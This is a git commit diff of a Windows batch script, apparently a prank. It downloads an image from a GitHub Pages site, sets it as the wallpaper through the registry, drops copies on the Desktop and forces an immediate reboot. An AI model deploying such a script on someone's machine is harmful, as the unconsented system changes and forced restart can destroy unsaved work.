100ae21bb6491133b7778b7e84cc0bfbaa2591e9
julian20yt <155905626+julian20yt@users.noreply.github.com>
2025-05-23 18:51:42 -0400

    bmp fix

--- sam.bat
+++ sam.bat
@@ -1,10 +1,10 @@
 mkdir C:\Sam
-powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "C:\Sam\wallpaper.jpg}"
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Sam\Wallpaper.jpg /f
+powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "C:\Sam\wallpaper.bmp}"
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Sam\Wallpaper.bmp /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 cd %UserProfile%\Desktop
-powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\ezip.jpg}"
-powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\a.jpg}"
-powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\b.jpg}"
-powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\c.jpg}"
+powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\ezip.bmp}"
+powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\a.bmp}"
+powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\b.bmp}"
+powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\c.bmp}"
 shutdown -r -t 0 -f
